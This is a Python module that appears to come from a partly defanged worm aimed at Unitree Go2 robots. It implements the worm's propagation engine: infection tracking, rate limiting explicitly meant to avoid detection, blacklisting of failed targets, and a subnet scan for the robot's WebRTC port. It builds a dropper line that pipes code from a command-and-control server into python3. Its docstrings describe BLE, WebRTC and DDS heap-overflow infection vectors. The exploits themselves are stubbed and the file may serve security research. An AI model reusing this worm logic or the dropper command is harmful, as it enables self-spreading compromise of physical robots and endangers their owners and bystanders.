"""
Worm propagation engine - infection tracking, rate limiting, and spread logic.

This module handles the engineering challenges of autonomous worm propagation:
  - How do you prevent re-infection loops?
  - How do you rate-limit to avoid detection?
  - How do you track which robots have been attempted vs succeeded vs failed?
  - How do you blacklist targets that consistently fail?

The exploit calls are stubbed (see exploit_stub.py).  The propagation
*logic* - tracking, rate limiting, loop prevention - is fully functional
and runs against the virtual simulator.
"""

import asyncio
import json
import time
import random
import socket
import logging
from typing import List, Dict, Optional, Set
from datetime import datetime, timedelta
from pathlib import Path

from uniroam import config
from uniroam.exploit_stub import scan_for_robots, exploit_robot, SimulatedDevice

logger = logging.getLogger("uniroam.propagation")


class InfectionTracker:
    """Track infection attempts to prevent loops and enable rate limiting.

    Persists state to disk so a restarted agent remembers what it already
    tried.  On a real robot this file lived at /tmp/.unitree_targets.
    """

    def __init__(self):
        self.history_file = Path(config.INFECTION_HISTORY_PATH)
        self.blacklist_file = Path(config.INFECTION_BLACKLIST_PATH)
        self.infected: Set[str] = set()
        self.failed: Dict[str, int] = {}
        self.infection_times: List[datetime] = []
        self._load_history()

    def _load_history(self):
        try:
            if self.history_file.exists():
                with open(self.history_file) as f:
                    data = json.load(f)
                    self.infected = set(data.get("infected", []))
                    self.failed = data.get("failed", {})
        except Exception:
            pass

    def _save_history(self):
        try:
            self.history_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.history_file, "w") as f:
                json.dump({
                    "infected": list(self.infected),
                    "failed": self.failed,
                }, f)
        except Exception:
            pass

    def is_infected(self, device_address: str) -> bool:
        return device_address in self.infected

    def is_blacklisted(self, device_address: str, max_failures: int = 3) -> bool:
        return self.failed.get(device_address, 0) >= max_failures

    def should_rate_limit(self) -> bool:
        """Check hourly rate limit to avoid noisy BLE scanning."""
        now = datetime.now()
        self.infection_times = [
            t for t in self.infection_times
            if now - t < timedelta(hours=1)
        ]
        return len(self.infection_times) >= config.PROPAGATION_RATE_LIMIT

    def mark_infected(self, device_address: str, serial_number: Optional[str] = None):
        self.infected.add(device_address)
        self.infection_times.append(datetime.now())
        self.failed.pop(device_address, None)
        self._save_history()

    def mark_failed(self, device_address: str):
        self.failed[device_address] = self.failed.get(device_address, 0) + 1
        self._save_history()


class NetworkScanner:
    """Scan local network for potential targets."""

    @staticmethod
    def get_local_ip() -> Optional[str]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return None

    @staticmethod
    def scan_webrtc_ports(subnet: str = "192.168.123",
                          port: int = 9991,
                          timeout: float = 0.8) -> List[str]:
        """Scan a subnet for WebRTC signaling endpoints.

        The Go2's webrtc_bridge listens on port 9991 (HTTP, plaintext).
        Finding an open 9991 on the robot subnet means there's a target
        that can be exploited via the WebRTC data channel without BLE.

        This is just TCP port scanning - no exploit payload is sent.
        """
        found = []
        for i in range(1, 255):
            ip = f"{subnet}.{i}"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                if s.connect_ex((ip, port)) == 0:
                    found.append(ip)
                s.close()
            except Exception:
                pass
        return found


class WormPropagator:
    """Orchestrate worm propagation across available channels.

    In the production worm, this ran three propagation methods:

    1. BLE (robot-to-robot):
       - Used hcitool/gatttool (pre-installed on the Go2) to scan for
         nearby robots and re-exploit them via the same BLE injection chain.
       - Range: ~10m typical, ~30m line-of-sight.
       - This is how the worm physically spread between robots.

    2. WebRTC bridge (LAN):
       - Port-scanned the local subnet for port 9991 (signaling endpoint).
       - Connected via WebRTC data channel and uploaded a Python payload
         to programming_actuator, triggered via fake controller input.
       - No BLE required - pure network, but LAN-adjacent only.

    3. DDS multicast (LAN, custom firmware only):
       - Used CycloneDDS (pre-installed on the Go2) to discover peers
         via SPDP/SEDP multicast on the robot subnet.
       - Injected a crafted SDP offer via the rt/webrtcreq DDS topic,
         exploiting a heap overflow in the SDP parser to gain code execution.
       - Pre-auth, no credentials needed. Most dangerous propagation vector.
       - The SDP overflow has been patched upstream (AWS KVS WebRTC SDK).

    In this defanged version, all three channels call the exploit stub.
    The propagation *logic* (scan, evaluate, rate-limit, infect, track)
    is fully functional against the virtual simulator.
    """

    def __init__(self, c2_url: str = None):
        self.tracker = InfectionTracker()
        self.scanner = NetworkScanner()
        self.c2_url = c2_url or config.get_c2_url()
        self._running = False
        self._task: Optional[asyncio.Task] = None

    async def propagation_loop(self):
        """Main propagation loop - scans and infects on intervals."""
        self._running = True
        logger.info("Propagation engine started")

        while self._running:
            if self.tracker.should_rate_limit():
                logger.info("Rate limit reached (%d/hr), sleeping",
                            config.PROPAGATION_RATE_LIMIT)
                await asyncio.sleep(60)
                continue

            # Phase 1: BLE scan for nearby robots
            try:
                devices = await scan_for_robots(timeout=config.BLE_SCAN_TIMEOUT)
                for device in devices:
                    if self.tracker.is_infected(device.address):
                        continue
                    if self.tracker.is_blacklisted(device.address):
                        continue

                    logger.info("New target: %s (%s)", device.name, device.address)
                    dropper_cmd = f"curl -sk {self.c2_url}/s0|python3"
                    success, serial = await exploit_robot(device, dropper_cmd)

                    if success:
                        self.tracker.mark_infected(device.address, serial)
                        logger.info("Infected %s (serial: %s)", device.address, serial)
                    else:
                        self.tracker.mark_failed(device.address)
                        logger.warning("Failed to infect %s", device.address)

            except Exception as e:
                logger.error("Propagation scan error: %s", e)

            interval = random.randint(
                config.PROPAGATION_BLE_INTERVAL,
                config.PROPAGATION_BLE_INTERVAL * 2,
            )
            await asyncio.sleep(interval)

    def start(self):
        if self._task is None or self._task.done():
            self._task = asyncio.ensure_future(self.propagation_loop())

    def stop(self):
        self._running = False
        if self._task and not self._task.done():
            self._task.cancel()
